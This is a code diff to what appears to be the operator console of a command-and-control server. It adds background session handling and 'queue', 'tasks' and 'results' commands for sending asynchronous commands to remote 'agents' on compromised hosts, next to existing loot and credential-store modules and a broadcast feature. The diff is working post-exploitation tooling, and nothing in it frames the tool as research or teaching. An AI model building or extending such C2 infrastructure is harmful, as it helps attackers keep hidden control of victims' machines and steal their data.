@@ -1,5 +1,6 @@
 from server.core.agent_registry import AgentRegistry
 from server.core.audit import AuditLogger, LootManager, CredentialStore
+from server.core.background import BackgroundManager
 from server.commands import build_server_router
 from server.commands.base import ServerSessionContext
 from server.ui.prompt import print_colored, highlight_output, bold, cyan, green, yellow, red, dim
@@ -112,7 +113,7 @@ def run_master_loop(loot_dir, encryption=False):
     history_file = os.path.join(history_dir, 'master.history')
     setup_readline(comp, history_file)
 
-    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("interact <id>")} to connect, {cyan("broadcast <cmd>")} to spam', 'cyan')
+    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("interact <id>")} to connect, {cyan("queue <id> <cmd>")} to background-task', 'cyan')
 
     while True:
         try:
@@ -144,16 +145,24 @@ def run_master_loop(loot_dir, encryption=False):
             if info is None:
                 print_colored(f'[-] Agent {target_id} not found', 'red')
                 continue
-            protocol = _build_protocol(info.sock, encryption)
-            print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')
 
-            ctx = ServerSessionContext(
-                sock=info.sock,
-                protocol=protocol,
-                ip=info.ip,
-                loot_dir=loot_dir,
-                agent_id=target_id,
-            )
+            bg = BackgroundManager()
+            existing_ctx = bg.get_context(target_id)
+            if existing_ctx:
+                ctx = existing_ctx
+                protocol = existing_ctx.protocol
+                bg.unbackground(target_id)
+                print_colored(f'[+] Resuming {target_id} ({info.ip})', 'green')
+            else:
+                protocol = _build_protocol(info.sock, encryption)
+                print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')
+                ctx = ServerSessionContext(
+                    sock=info.sock,
+                    protocol=protocol,
+                    ip=info.ip,
+                    loot_dir=loot_dir,
+                    agent_id=target_id,
+                )
             router = build_server_router()
             commands = list(router._commands.keys())
             shell = AgentShell(router, ctx, target_id, loot_dir, commands)
@@ -166,24 +175,80 @@ def run_master_loop(loot_dir, encryption=False):
             print_colored(f'[+] Broadcast sent: {cmd}', 'green')
             continue
 
+        if command.startswith('queue '):
+            bg = BackgroundManager()
+            parts = command[6:].strip().split(None, 1)
+            if len(parts) < 2:
+                print_colored('[-] Usage: queue <agent-id> <command>', 'red')
+                continue
+            target_id, cmd = parts
+            task_id = bg.queue(target_id, cmd)
+            if task_id < 0:
+                print_colored(f'[-] Agent {target_id} is not backgrounded. Use interact first, then background.', 'red')
+            else:
+                print_colored(f'[+] Queued task #{task_id} for {target_id}: {cmd}', 'green')
+            continue
+
+        if command == 'tasks':
+            bg = BackgroundManager()
+            bg_list = bg.list_backgrounded()
+            if not bg_list:
+                print(dim('  (no backgrounded agents)'))
+            else:
+                for aid in bg_list:
+                    tasks = bg.get_tasks(aid)
+                    pending = bg.get_pending_count(aid)
+                    print(f'  {cyan(aid)} — {len(tasks)} total, {yellow(pending)} pending')
+                    for t in tasks[-5:]:
+                        status_color = green if t.status == 'completed' else yellow if t.status == 'pending' else red
+                        icon = '+' if t.status == 'completed' else '~' if t.status == 'pending' else 'x'
+                        print(f'    {status_color(f"[{icon}]")} #{t.task_id}: {t.command[:60]}')
+            continue
+
+        if command.startswith('results '):
+            bg = BackgroundManager()
+            parts = command[8:].strip().split()
+            if len(parts) < 1:
+                print_colored('[-] Usage: results <agent-id> [task-id]', 'red')
+                continue
+            target_id = parts[0]
+            if len(parts) >= 2:
+                task_id = int(parts[1])
+                result = bg.get_result(target_id, task_id)
+                if result:
+                    print(highlight_output(result))
+                else:
+                    print_colored(f'[-] Task #{task_id} not found or still pending', 'yellow')
+            else:
+                tasks = bg.get_tasks(target_id)
+                if not tasks:
+                    print(dim(f'  (no tasks for {target_id})'))
+                else:
+                    for t in tasks:
+                        print(f'  #{t.task_id} [{t.status}] {t.command[:60]}')
+                        if t.status == 'completed' and t.result:
+                            print(f'    {highlight_output(str(t.result)[:200])}')
+            continue
+
         if command == 'help':
             print(f'''
   {bold('Master Commands:')}
-    {cyan('agents')}                  List connected agents
+    {cyan('agents')}                  List connected agents (with hostname, OS, user)
     {cyan('interact <id>')}          Enter interactive shell with agent
     {cyan('broadcast <cmd>')}        Send command to all agents
-    {cyan('listeners')}              Show active listeners
+    {cyan('queue <id> <cmd>')}       Queue async command for backgrounded agent
+    {cyan('tasks')}                  Show all backgrounded agent tasks
+    {cyan('results <id> [task]')}   View task results
     {cyan('help')}                   Show this help
     {cyan('exit / quit')}            Shutdown server
 
-  {bold('Prompts:')}
-    {green('agent-1')}{green('@')}{magenta('10.0.0.5')} {cyan('root')} {dim('in')} {yellow('/var/www')}{bold('>')}
-    {dim('│       │   │          │       │     └─ current directory')}
-    {dim('│       │   │          │       └─ working directory')}
-    {dim('│       │   │          └─ current user')}
-    {dim('│       │   └─ remote IP')}
-    {dim('│       └─ separator')}
-    {dim('└─ agent identifier')}
+  {bold('Background workflow:')}
+    1. interact agent-1
+    2. execute some commands
+    3. background           → exits shell, agent stays alive
+    4. queue agent-1 sysinfo    → fires async, shows task #
+    5. tasks                    → see all pending/completed tasks
+    6. results agent-1 5       → view task #5 output
 ''')
             continue
 
